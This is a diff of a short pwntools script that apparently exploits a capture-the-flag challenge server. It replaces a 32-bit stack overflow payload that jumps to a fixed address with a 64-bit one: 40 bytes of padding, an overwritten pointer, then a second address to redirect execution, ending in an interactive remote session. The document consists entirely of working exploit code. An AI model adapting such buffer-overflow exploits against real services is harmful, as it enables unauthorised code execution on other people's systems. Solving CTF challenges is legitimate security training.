@@ -1,9 +1,14 @@
 from pwn import *
 
-p = remote("ctf.j0n9hyun.xyz",3001)
-payload = "a"*128
-jump= 0x804849b
-payload += p32(jump)
-p.send(payload)
-print p.recvrepeat(0.4)
-p.interactive()
+r=remote("ctf.j0n9hyun.xyz",3016)
+
+payload = "A"*40
+payload += p64(0x601068)
+
+#pause()
+r.sendline(payload)
+
+payload =p64(0x400826)
+r.sendline(payload)
+
+r.interactive()
